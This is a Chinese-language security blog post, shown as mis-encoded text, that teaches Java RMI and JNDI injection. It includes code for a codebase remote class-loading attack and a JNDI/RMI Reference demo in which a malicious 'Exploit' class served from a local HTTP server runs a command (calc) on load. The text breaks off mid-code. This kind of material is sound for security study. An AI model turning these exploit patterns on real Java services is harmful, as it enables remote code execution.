<h3 id="RMIç®€å•å…¥é—¨"><a href="#RMIç®€å•å…¥é—¨" class="headerlink" title="RMIç®€å•å…¥é—¨"></a>RMIç®€å•å…¥é—¨</h3><p>RMI(Remote Method Invocation)ï¼Œè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œæ˜¯Javaç‹¬æœ‰çš„ä¸€ç§æœºåˆ¶ï¼Œå…è®¸è¿è¡Œåœ¨ä¸€ä¸ªJavaè™šæ‹Ÿæœºçš„å¯¹è±¡è°ƒç”¨å¦ä¸€ä¸ªJavaè™šæ‹Ÿæœºä¸Šå¯¹è±¡çš„æ–¹æ³•</p>
<h4 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h4><p>RMIå’ŒRPCç±»ä¼¼ï¼Œä½†RPCä½œä¸ºCè¯­è¨€çš„ä¸€ä¸ªåˆ†æ”¯ï¼Œä¸»è¦å…³æ³¨æ•°æ®ç»“æ„ï¼Œè€ŒRMIä¸ä»…ä½¿ç”¨æ•°æ®ç»“æ„ï¼Œè¿˜ä¼šé€‚ç”¨å¯¹è±¡</p>
<p>åœ¨ä¸€ä¸ªå¯¹è±¡å¯ä»¥ä¸RMIä¸€èµ·ä½¿ç”¨ä¹‹å‰ï¼Œè¿™ä¸ªå¯¹è±¡å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„ï¼ˆRMIçš„ä¼ è¾“æ—¶åŸºäºååºåˆ—åŒ–çš„ï¼‰ã€‚RMIçš„è¿œç¨‹å¯¹è±¡æ˜¯é€šè¿‡å¼•ç”¨ä¼ é€’çš„ï¼Œè€Œéè¿œç¨‹å¯¹è±¡æ˜¯é€šè¿‡å¤åˆ¶ä¼ é€’</p>
<p>å¯¹äºä»»ä½•ä¸€ä¸ªä»¥å¯¹è±¡ä¸ºå‚æ•°çš„RMIæ¥å£ï¼Œéƒ½å¯ä»¥å‘ä¸€ä¸ªè‡ªå·±æ„å»ºçš„å¯¹è±¡ï¼Œè¿«ä½¿æœåŠ¡å™¨ç«¯å°†è¿™ä¸ªå¯¹è±¡æŒ‰ä»»ä½•ä¸€ä¸ªå­˜åœ¨äºæœåŠ¡ç«¯classpathä¸­çš„å¯åºåˆ—åŒ–ç±»æ¥ååºåˆ—åŒ–æ¢å¤å¯¹è±¡</p>
<p><strong>ä¸‰ä¸ªä¸»ä½“ï¼š</strong></p>
<p>1.Client å®¢æˆ·ç«¯</p>
<p>2.Server æœåŠ¡ç«¯</p>
<p>3.Registry æ³¨å†Œä¸­å¿ƒ</p>
<p><strong>RMI Server</strong>åˆ†æˆä¸‰éƒ¨åˆ†</p>
<blockquote>
<ol>
<li>ä¸€ä¸ªç»§æ‰¿<code>java.rmi.Remote</code>çš„æ¥å£ï¼Œå…¶ä¸­å®šä¹‰æˆ‘ä»¬è¦è¿œç¨‹è°ƒç”¨çš„å‡½æ•°ï¼Œå¹¶ä¸”æ¯ä¸ªæ–¹æ³•å¿…é¡»è¦æŠ›å‡º<code>java.rmi.RemoteException</code></li>
<li>ä¸€ä¸ªå®ç°æ­¤æ¥å£çš„ç±»ï¼Œé€šå¸¸éƒ½ä¼šæ‰©å±•<code>java.rmi.UnicastRemoteObject</code></li>
<li>ä¸€ä¸ªä¸»ç±»ï¼Œç”¨æ¥åˆ›å»ºRegistryï¼Œå¹¶å°†ä¸Šé¢çš„ç±»å®ä¾‹åŒ–ä¹‹åç»‘å®šåˆ°ä¸€ä¸ªåœ°å€</li>
</ol>
</blockquote>
<p><strong>å­˜æ ¹å’Œéª¨æ¶</strong></p>
<p>ç”¨äºè¿œç¨‹å¯¹è±¡çš„å®ç°ã€‚</p>
<p>å­˜æ ¹(stub)æ˜¯æƒ³è°ƒç”¨çš„æ–¹æ³•çš„å¯¹è±¡æ‰€ä»£ç†çš„æœ¬åœ°ä»£ç ï¼›</p>
<p>éª¨æ¶(skeleton)ä»å­˜æ ¹æ¥æ”¶è¿œç¨‹æ–¹æ³•è°ƒç”¨å¹¶å°†å®ƒä»¬ä¼ é€’ç»™å¯¹è±¡</p>
<p><strong>RMI Registry</strong></p>
<p>ä¸»è¦æµç¨‹ï¼š</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/1519089/1632667693674-ef6724af-9a79-45d6-a87e-b334d3948bd4.png"></p>
<blockquote>
<p>RMI Registryå°±åƒâ¼€ä¸ªâ½¹å…³ï¼Œä»–â¾ƒâ¼°æ˜¯ä¸ä¼šæ‰§â¾è¿œç¨‹â½…æ³•çš„ï¼Œä½†RMI Serverå¯ä»¥åœ¨ä¸Šâ¾¯æ³¨å†Œâ¼€ä¸ªNameåˆ°å¯¹è±¡çš„ç»‘å®šå…³ç³»ï¼›RMI Clienté€šè¿‡Nameå‘RMI RegistryæŸ¥è¯¢ï¼Œå¾—åˆ°è¿™ä¸ªç»‘å®šå…³ç³»ï¼Œç„¶åå†è¿æ¥RMI Serverï¼›æœ€åï¼Œè¿œç¨‹â½…æ³•å®é™…ä¸Šåœ¨RMI Serverä¸Šè°ƒâ½¤ã€‚</p>
</blockquote>
<p>ä¾‹å­ï¼š</p>
<p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªæ‰©å±•äº†Remoteçš„æ¥å£ï¼Œå¹¶å£°æ˜ä¸€ä¸ªæˆ‘ä»¬éœ€è¦è°ƒç”¨çš„æ–¹æ³•ï¼Œè®°å¾—æŠ›å‡º<code>RemoteException</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">RmiInterface</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(String param)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºä¸€ä¸ªå®ç°è¯¥æ¥å£çš„ç±»ï¼Œå¹¶ä¸”ç»§æ‰¿äº†<code>UnicastRemoteObject</code>ï¼Œé‡å†™æ–¹æ³•ï¼Œå¹¶åœ¨è¿™é‡Œå»ºç«‹<code>Registry</code>å¹¶å‘æ³¨å†Œå»ºç«‹è¿œç¨‹å¯¹è±¡ï¼Œå°†å¯¹è±¡å®ä¾‹å’ŒRegistryçš„<code>hello</code>ç»‘å®šåœ¨ä¸€èµ·</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloHandler</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">RmiInterface</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String hello = <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">HelloHandler</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(String param)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> hello+param;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        RmiInterface rmiInterface = <span class="keyword">new</span> HelloHandler();</span><br><span class="line">        registry.bind(<span class="string">&quot;hello&quot;</span>,rmiInterface);</span><br><span class="line">        <span class="comment">// Naming.bind(&quot;rmi://ip:port/hello&quot;,rmiInterface) è¿œç¨‹å†™æ³•</span></span><br><span class="line">        <span class="comment">// Naming.bind(&quot;hello&quot;,rmiInterface) æœ¬åœ°å†™æ³•</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®¢æˆ·ç«¯ï¼šé€šè¿‡<code>LocateRegistry.getRegistry</code>è®¿é—®è¿œç¨‹çš„registryå¯¹è±¡ï¼Œå¹¶é€šè¿‡lookupæ–¹æ³•æ‰¾åˆ°ç»‘å®šäº†å¯¹è±¡å®ä¾‹çš„skeletonï¼Œç„¶åè°ƒç”¨ç›¸åº”çš„æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">            RmiInterface rmiInterface = (RmiInterface) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">            String name = <span class="string">&quot;Ameuu&quot;</span>;</span><br><span class="line">            System.out.println(rmiInterface.hello(name));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/3e38745a45d34f5e81c741ad242f5067.png"></p>
<h4 id="RMIå®‰å…¨"><a href="#RMIå®‰å…¨" class="headerlink" title="RMIå®‰å…¨"></a>RMIå®‰å…¨</h4><p>æˆ‘ä»¬ä»…ä»å®¢æˆ·ç«¯è§’åº¦æ¥çœ‹ä¸€ä¸‹RMIï¼š<br>å®¢æˆ·ç«¯è¿æ¥<code>Registry</code>å¹¶å»å¯»æ‰¾æŸä¸ªNameï¼Œä»è€Œæ‰¾åˆ°å…¶ç»‘å®šçš„å¯¹è±¡å®ä¾‹ï¼Œç„¶åå»è°ƒç”¨è¿™ä¸ªè¿œç¨‹å¯¹è±¡çš„æŸä¸ªæ–¹æ³•</p>
<p>é‚£ä¹ˆï¼š</p>
<blockquote>
<ol>
<li>å¦‚æœæˆ‘ä»¬èƒ½è®¿é—®RMI RegistryæœåŠ¡ï¼Œå¦‚ä½•å¯¹å…¶æ”»å‡»ï¼Ÿ </li>
<li>å¦‚æœæˆ‘ä»¬æ§åˆ¶äº†ç›®æ ‡RMIå®¢æˆ·ç«¯ä¸­ Naming.lookup çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆä¹Ÿå°±æ˜¯RMI Registryçš„åœ° å€ï¼‰ï¼Œèƒ½ä¸èƒ½è¿›è¡Œæ”»å‡»ï¼Ÿ</li>
</ol>
</blockquote>
<h5 id="æ”»å‡»Registry"><a href="#æ”»å‡»Registry" class="headerlink" title="æ”»å‡»Registry"></a>æ”»å‡»Registry</h5><p>Javaå¯¹è¿œç¨‹è®¿é—®RMI Registryåšäº†é™åˆ¶ï¼Œåªæœ‰æ¥æºåœ°å€æ˜¯localhostçš„æ—¶å€™ï¼Œæ‰èƒ½è°ƒç”¨rebindã€ bindã€unbindç­‰æ–¹æ³•ã€‚</p>
<p>ä½†æ˜¯å¯ä»¥é€šè¿‡listè·å–ç›®æ ‡ä¸Šç»‘å®šçš„æ‰€æœ‰å¯¹è±¡ã€é€šè¿‡lookupè·å–æŸä¸ªå¯¹è±¡</p>
<p><a href="https://github.com/NickstaDB/BaRMIe">BaRMIe</a></p>
<h5 id="codebaseæ‰§è¡Œä»»æ„ä»£ç "><a href="#codebaseæ‰§è¡Œä»»æ„ä»£ç " class="headerlink" title="codebaseæ‰§è¡Œä»»æ„ä»£ç "></a>codebaseæ‰§è¡Œä»»æ„ä»£ç </h5><p><strong>codebase</strong>æ˜¯ä¸€ä¸ªåœ°å€ï¼Œåœ¨RMIæµç¨‹ä¸­ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ç›´æ¥ä¼ é€’çš„æ˜¯åºåˆ—åŒ–çš„å¯¹è±¡ï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šå»æ‰¾ç›¸åº”çš„ç±»è¿›è¡Œå®ä¾‹åŒ–ï¼Œè€Œå¦‚æœåœ¨æœ¬åœ°æ‰¾ä¸åˆ°çš„æ—¶å€™æœºä¼šè‡ªåŠ¨å»codebaseé‡Œé¢æ‰¾ï¼Œè€Œç›¸åº”çš„å°±äº§ç”Ÿäº†é—®é¢˜ï¼Œå¦‚æœcodebaseæ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„ï¼Œé‚£ä¹ˆæœ‰å¯èƒ½å¯ä»¥åŠ è½½æ¶æ„ç±»</p>
<p>æ¡ä»¶ï¼š</p>
<blockquote>
<ul>
<li>å®‰è£…å¹¶é…ç½®äº†SecurityManager</li>
<li>Javaç‰ˆæœ¬ä½äº7u21ã€6u45ï¼Œæˆ–è€…è®¾ç½®äº†java.rmi.useCodebaseOnly=falseï¼Œå› ä¸ºåœ¨java7u21ã€6u45çš„æ—¶å€™ä¿®æ”¹é»˜è®¤è®¾ç½®java.rmi.useCodebaseOnly=trueï¼Œè¿™ä½¿å¾—javaè™šæ‹Ÿæœºåªä¿¡ä»»é¢„å…ˆé…ç½®å¥½çš„<code>codebase</code>ï¼Œä¸å†æ”¯æŒä»RMIè¯·æ±‚ä¸­è·å–</li>
</ul>
</blockquote>
<p>ä¾‹å­ï¼ˆä»£ç æ¥è‡ªPç¥ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ICalc.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ICalc</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Calc.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Calc</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">ICalc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Calc</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        Integer sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Integer param : params) &#123;</span><br><span class="line">            sum += param;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// RemoteRMIServer.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteRMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;setup SecurityManager&quot;</span>);</span><br><span class="line">            System.setSecurityManager(<span class="keyword">new</span> SecurityManager());</span><br><span class="line">        &#125;</span><br><span class="line">        Calc h = <span class="keyword">new</span> Calc();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;refObj&quot;</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> RemoteRMIServer().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// client.policy</span></span><br><span class="line">grant &#123;</span><br><span class="line">    permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘å¹¶é…ç½®å‚æ•°ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac *.java</span><br><span class="line">java -D java.rmi.server.hostname=192.168.64.1 -D java.rmi.server.useCodebaseOnly=false -D java.security.policy=client.policy RemoteRMIServer</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>java.rmi.server.hostname</code>ä¸ºæœåŠ¡å™¨çš„IPåœ°å€ï¼Œè¿œç¨‹è°ƒç”¨æ—¶éœ€è¦æ ¹æ®è¿™ä¸ªå€¼æ¥è®¿é—®RMI Serverã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// RMIClient.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Payload</span> <span class="keyword">extends</span> <span class="title">ArrayList</span>&lt;<span class="title">Integer</span>&gt; </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ICalc r = (ICalc)</span><br><span class="line">            Naming.lookup(<span class="string">&quot;rmi://192.168.135.142:1099/refObj&quot;</span>);</span><br><span class="line">        List&lt;Integer&gt; li = <span class="keyword">new</span> Payload();</span><br><span class="line">        li.add(<span class="number">3</span>);</span><br><span class="line">        li.add(<span class="number">4</span>);</span><br><span class="line">        System.out.println(r.sum(li));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> RMIClient().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -D java.rmi.server.useCodebaseOnly=false -</span><br><span class="line">D java.rmi.server.codebase=http://example.com/RMIClient</span><br></pre></td></tr></table></figure>

<blockquote>
<p>åœ¨æœ€å¼€å§‹å°±æŠ¥é”™äº† æ‰€ä»¥å¤ç°å°±å…ˆæç½®äº† ä¸è¿‡è¿™ä¸ªä»£ç æ‰§è¡Œçš„æ–¹æ³•æ¡ä»¶æ¯”è¾ƒè‹›åˆ» ä¹Ÿä¸å¸¸ç”¨ï¼ˆå¤§æ¦‚</p>
</blockquote>
<h3 id="JNDIå…¥é—¨"><a href="#JNDIå…¥é—¨" class="headerlink" title="JNDIå…¥é—¨"></a>JNDIå…¥é—¨</h3><p>JNDIï¼ˆJava Naming and Directory Interfaceï¼‰ï¼Œæ˜¯SUNå…¬å¸æä¾›çš„â¼€ç§æ ‡å‡†çš„<strong>Javaå‘½åç³»ç»Ÿæ¥â¼</strong>ã€‚ä¸ºå¼€å‘â¼ˆå‘˜æä¾›äº†æŸ¥æ‰¾å’Œè®¿é—®å„ç§å‘½åå’Œâ½¬å½•æœåŠ¡çš„é€šâ½¤ã€ç»Ÿâ¼€çš„æ¥â¼ï¼Œç±»ä¼¼JDBCéƒ½æ˜¯æ„å»ºåœ¨æŠ½è±¡å±‚ä¸Šã€‚ ç°åœ¨JNDIå·²ç»æˆä¸ºJ2EEçš„æ ‡å‡†ä¹‹â¼€ï¼Œæ‰€æœ‰çš„J2EEå®¹å™¨éƒ½å¿…é¡»æä¾›â¼€ä¸ªJNDIçš„æœåŠ¡ã€‚</p>
<p>é€šè¿‡è¿”å›Referenceå’Œè°ƒç”¨lookupè·å¾—ç›¸åº”çš„æ•°æ®æºã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/be2c8e2e1a2c4983a3ed9b3505a21ee7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><strong>Naming Service</strong></p>
<p>å‘½åæœåŠ¡ï¼Œå°†åç§°ä¸å€¼ç›¸å…³è”çš„å®ä½“ï¼Œç§°ä¸ºâ€œç»‘å®šâ€ã€‚æä¾›äº†ä¸€ç§ä½¿ç”¨â€œfindâ€æˆ–â€œsearchâ€æ“ä½œæ¥æ ¹æ®åç§°æŸ¥æ‰¾å¯¹è±¡çš„ä¾¿æ·æ–¹å¼ï¼Œå°±æ¯”å¦‚ä¸Šé¢å­¦RMIçš„æ—¶å€™æ ¹æ®<code>Name</code>å»è·å–å¯¹åº”çš„å¯¹è±¡</p>
<p><strong>Directory Service</strong></p>
<p>ä¸€ç§ç‰¹æ®Šçš„å‘½åæœåŠ¡ï¼Œå…è®¸å­˜å‚¨äº†æœç´¢â€œç›®å½•å¯¹è±¡â€</p>
<p>ä½¿ç”¨JNDIå¿…é¡»è¦æœ‰æœåŠ¡æä¾›æ–¹</p>
<p>ä¸€äº›æœåŠ¡æ¥å£ï¼š</p>
<ul>
<li>LDAP è½»é‡çº§ç›®å½•è®¿é—®åè®®</li>
<li>CORBA å…¬å…±å¯¹è±¡è¯·æ±‚ä»£ç†ç»“æ„æœåŠ¡</li>
<li>RMI è¿œç¨‹æ–¹æ³•è°ƒç”¨</li>
<li>DNS åŸŸåæœåŠ¡</li>
</ul>
<blockquote>
<p>åœ¨JNDIæ³¨å…¥ä¸­æ¶‰åŠæœ€å¤šçš„æ˜¯LDAPã€RMI</p>
</blockquote>
<h4 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h4><blockquote>
<p>å·¥å‚æ¨¡å¼</p>
<p>ä¼šåˆ©ç”¨åˆ°codebase </p>
<p>åœ¨java7u21ã€6u45ã€8u113 çš„æ—¶å€™ä¿®æ”¹é»˜è®¤è®¾ç½®java.rmi.useCodebaseOnly=true</p>
<p>ç¯å¢ƒï¼šjdk8u112</p>
</blockquote>
<h5 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h5><p>å­˜å‚¨ç±»åï¼Œå·¥å‚åä»¥åŠåŠ è½½å·¥å‚çš„æœªçŸ¥ï¼Œéƒ½å¯ä»¥é€šè¿‡å¯¹åº”çš„getè·å–</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Reference</span><span class="params">(String className, String factory, String factoryLocation)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(className);</span><br><span class="line">    classFactory = factory;</span><br><span class="line">    classFactoryLocation = factoryLocation;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="ReferenceWrapper"><a href="#ReferenceWrapper" class="headerlink" title="ReferenceWrapper"></a>ReferenceWrapper</h5><p>RMIæœåŠ¡ä¸­å®ç°äº†<code>RemoteReference</code>çš„ç±»ï¼Œå•çº¯åœ°è·å–<code>Reference</code>å¹¶è¿”å›<code>Reference</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ReferenceWrapper</span><span class="params">(Reference var1)</span> <span class="keyword">throws</span> NamingException, RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.wrappee = var1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Reference <span class="title">getReference</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.wrappee;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h5><h6 id="Exploitç±»ï¼ˆæ¶æ„ç±»"><a href="#Exploitç±»ï¼ˆæ¶æ„ç±»" class="headerlink" title="Exploitç±»ï¼ˆæ¶æ„ç±»"></a>Exploitç±»ï¼ˆæ¶æ„ç±»</h6><p>è¦å®ç°<code>ObjectFactory</code>æ¥å£</p>
<p>ç¼–è¯‘ä¹‹åæ”¾åœ¨<code>http://127.0.0.1:8000</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String cmd;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello ameuu&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h6 id="æœåŠ¡-Server"><a href="#æœåŠ¡-Server" class="headerlink" title="æœåŠ¡ Server"></a>æœåŠ¡ Server</h6><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// æä¾›æœåŠ¡ æ³¨å†Œ å°†å¯¹è±¡ä¸å¯¹åº”çš„Nameè¿›è¡Œç»‘å®š</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// å®ç°åŠ è½½è¯¥ç›®å½•ä¸‹çš„Exploit</span></span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;Exploit&quot;</span>,<span class="string">&quot;Exploit&quot;</span>,<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span 